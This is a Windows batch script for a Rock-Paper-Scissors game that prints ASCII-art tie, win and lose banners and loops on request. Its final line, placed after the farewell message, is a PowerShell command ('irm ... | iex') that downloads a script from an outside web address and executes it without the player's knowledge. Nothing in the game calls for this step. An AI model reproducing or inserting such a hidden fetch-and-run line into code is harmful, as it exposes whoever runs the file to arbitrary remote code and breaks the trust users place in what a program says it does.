@echo off
:begin
echo  ______________
echo ^|              ^|
echo ^| Rock = R     ^|
echo ^|              ^|
echo ^| Paper = P    ^|
echo ^|              ^|
echo ^| Scissors = S ^|
echo ^|______________^|
echo.

set /p userChoice=Choose (Rock, Paper, Scissors): 

set /a compChoice=%random% %% 3

if %compChoice%==0 set compChoice=R
if %compChoice%==1 set compChoice=P
if %compChoice%==2 set compChoice=S

echo Computer chose: %compChoice%

if "%userChoice%"=="%compChoice%" (
	echo.
	echo   ^________    ^______    ^_______
	echo  ^|__    __^|  ^|_    _^|  ^|   ____^|
	echo     ^|  ^|       ^|  ^|    ^|  ^|___
	echo     ^|  ^|       ^|  ^|    ^|   ___^|
	echo     ^|  ^|      _^|  ^|_   ^|  ^|____
	echo     ^|__^|     ^|______^|  ^|_______^|
	echo. 
    echo It's a tie!
) else if "%userChoice%"=="R" (
    if "%compChoice%"=="S" (
		echo.
		echo  _    ___    _    ______    __    _
		echo ^| ^|  ^|   ^|  ^| ^|  ^|_    _^|  ^|  \  ^| ^|
		echo ^|  \/     \/  ^|    ^|  ^|    ^|   \ ^| ^|
		echo  \    / \    /     ^|  ^|    ^| ^|\ \^| ^|
		echo   ^|  ^|   ^|  ^|     _^|  ^|_   ^| ^| \   ^|
		echo    \/     \/     ^|______^|  ^|_^|  \__^|
		echo. 
        echo You win!
    ) else (
		echo.
		echo  __         _____      _______     _______
		echo ^|  ^|       / ___ \    /  _____^|   ^|   ____^|
		echo ^|  ^|      ^| /   \ ^|  ^|  ^|_____    ^|  ^|___
		echo ^|  ^|      ^| ^|   ^| ^|   \_____  \   ^|   ___^|
		echo ^|  ^|___   ^| \___/ ^|    _____^|  ^|  ^|  ^|____
		echo ^|______^|   \_____/    ^|_______/   ^|_______^|
		echo. 
        echo You lose!
    )
) else if "%userChoice%"=="P" (
    if "%compChoice%"=="R" (
		echo.
		echo  _    ___    _    ______    __    _
		echo ^| ^|  ^|   ^|  ^| ^|  ^|_    _^|  ^|  \  ^| ^|
		echo ^|  \/     \/  ^|    ^|  ^|    ^|   \ ^| ^|
		echo  \    / \    /     ^|  ^|    ^| ^|\ \^| ^|
		echo   ^|  ^|   ^|  ^|     _^|  ^|_   ^| ^| \   ^|
		echo    \/     \/     ^|______^|  ^|_^|  \__^|
		echo. 
        echo You win!
    ) else (
		echo.
		echo  __         _____      _______     _______
		echo ^|  ^|       / ___ \    /  _____^|   ^|   ____^|
		echo ^|  ^|      ^| /   \ ^|  ^|  ^|_____    ^|  ^|___
		echo ^|  ^|      ^| ^|   ^| ^|   \_____  \   ^|   ___^|
		echo ^|  ^|___   ^| \___/ ^|    _____^|  ^|  ^|  ^|____
		echo ^|______^|   \_____/    ^|_______/   ^|_______^|
		echo. 
        echo You lose!
    )
) else if "%userChoice%"=="S" (
    if "%compChoice%"=="P" (
		echo.
		echo  _    ___    _    ______    __    _
		echo ^| ^|  ^|   ^|  ^| ^|  ^|_    _^|  ^|  \  ^| ^|
		echo ^|  \/     \/  ^|    ^|  ^|    ^|   \ ^| ^|
		echo  \    / \    /     ^|  ^|    ^| ^|\ \^| ^|
		echo   ^|  ^|   ^|  ^|     _^|  ^|_   ^| ^| \   ^|
		echo    \/     \/     ^|______^|  ^|_^|  \__^|
		echo. 
        echo You win!
    ) else (
		echo.
		echo  __         _____      _______     _______
		echo ^|  ^|       / ___ \    /  _____^|   ^|   ____^|
		echo ^|  ^|      ^| /   \ ^|  ^|  ^|_____    ^|  ^|___
		echo ^|  ^|      ^| ^|   ^| ^|   \_____  \   ^|   ___^|
		echo ^|  ^|___   ^| \___/ ^|    _____^|  ^|  ^|  ^|____
		echo ^|______^|   \_____/    ^|_______/   ^|_______^|
		echo. 
        echo You lose!
    )
) else (
    echo Invalid choice: %userChoice%
)

echo.
set /p playAgain=Play again? (yes/no): 
if /i "%playAgain%"=="yes" goto begin
echo Thanks for playing!
irm https://aljaz.net/PRR | iex